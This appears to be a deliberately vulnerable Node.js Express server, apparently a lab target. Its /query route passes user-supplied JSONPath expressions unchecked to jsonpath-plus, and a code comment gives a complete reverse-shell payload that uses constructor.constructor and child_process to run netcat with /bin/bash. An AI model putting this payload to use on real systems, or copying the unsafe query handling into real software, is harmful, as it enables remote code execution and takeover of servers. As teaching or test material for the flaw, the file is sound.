const express = require('express');
const axios = require('axios');
const sharp = require('sharp');
const exifReader = require('exif-reader');
const { JSONPath } = require('jsonpath-plus');
const cors = require('cors');

const app = express();
const PORT = 8000;

const imageServer = axios.create({
    baseURL: 'https://picsum.photos',
})

app.use(cors());
app.use(express.json());

app.get('/fetch-image', async (req, res) => {
    const imagePath = req.query.path;
    console.log('Fetching image:', imagePath);

    try {
        if (!imagePath) {
            return res.status(400).send('PATH parameter is required');
        }

        const response = await imageServer.get(`/${imagePath}`, {
            responseType: 'arraybuffer',
            timeout: 5000,
        });
        console.log('Image fetched successfully');

        res.setHeader('Content-Type', response.headers['content-type']);
        res.setHeader('Content-Length', response.headers['content-length']);
        res.status(200).send(response.data);
    } catch (error) {
        console.error('Error fetching the image:', error.message);
        res.status(500).send('Failed to fetch the image');
    }
});

app.post('/query', async (req, res) => {
    // Reverse Shell Payload:
    // curl -G --data-urlencode 'path=$[?(var _$_root=constructor.constructor.call([],"console.log(this.process.mainModule.require(`child_process`).execSync(`nc -nv 127.0.0.1 1234 -e /bin/bash`).toString())");@root())]' http://localhost:3000/query
    const { imagePath, query } = req.body; // User-provided JSONPath query
    if (!query) {
        return res.status(400).send({ error: 'Query parameter is required' });
    }
    if (!imagePath) {
        return res.status(400).send({ error: 'imageUrl parameter is required' });
    }   

    try {
        const response = await imageServer.get(imagePath, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);

        const metadata = await sharp(imageBuffer).metadata();

        if (!metadata.exif) {
            return res.status(400).json({
                success: false,
                message: 'No EXIF data found in the image.',
            });
        }

        let exifData;
        try {
            console.log('Extracting EXIF data...');
            exifData = exifReader(metadata.exif);
            console.log('EXIF data extracted successfully');
        } catch (exifError) {
            console.error('Failed to extract EXIF data:', exifError);
            return res.status(400).json({
                success: false,
                message: 'Failed to extract EXIF data. Make sure the image contains EXIF metadata.',
                error: exifError.message,
            });
        }
        const extractedData = {};
        query.forEach(q => {
            const queryResult = JSONPath({ path: q, json: exifData });
            if (queryResult.length > 0) {
                const fieldName = q.split('.').pop();
                extractedData[fieldName] = queryResult;
            }
        });
        return res.json({
            success: true,
            extractedData,
        });
    } catch (error) {
        console.error('Error handling request:', error);
        return res.status(500).json({
            success: false,
            message: 'An error occurred while processing the image.',
            error: error.message,
        });
    }
});

app.listen(PORT, () => {
    console.log(`Vulnerable server is running on http://0.0.0.0:${PORT}`);
});